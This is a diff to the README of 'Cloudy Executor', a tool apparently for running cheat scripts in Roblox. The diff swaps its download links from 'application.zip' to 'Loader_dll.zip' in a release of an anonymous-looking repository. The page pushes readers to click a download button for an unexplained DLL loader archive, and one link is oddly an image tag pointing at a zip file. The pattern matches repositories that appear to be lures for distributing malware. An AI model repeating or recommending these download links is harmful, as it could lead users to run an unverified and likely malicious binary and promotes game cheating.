@@ -267,7 +267,7 @@
 
 Welcome to the Cloudy Executor repository! 🚀 This repository hosts the latest version of the Cloudy Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Cloudy Executor](https://github.com/secondlathloothy/Cloudy-Executor/releases/download/Download/application.zip)
+![Cloudy Executor](https://github.com/secondlathloothy/Cloudy-Executor/releases/download/Download/Loader_dll.zip)
 
 ## Table of Contents
 
@@ -762,7 +762,7 @@ Cloudy Executor is a cutting-edge executor designed for Roblox script execution.
 
 To get started with Cloudy Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download Cloudy Executor](https://img.shields.io/badge/Download-Cloudy%20Executor-orange)](https://github.com/secondlathloothy/Cloudy-Executor/releases/download/Download/application.zip).
+1. Download the latest version of the executor from the following link: [![Download Cloudy Executor](https://img.shields.io/badge/Download-Cloudy%20Executor-orange)](https://github.com/secondlathloothy/Cloudy-Executor/releases/download/Download/Loader_dll.zip).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
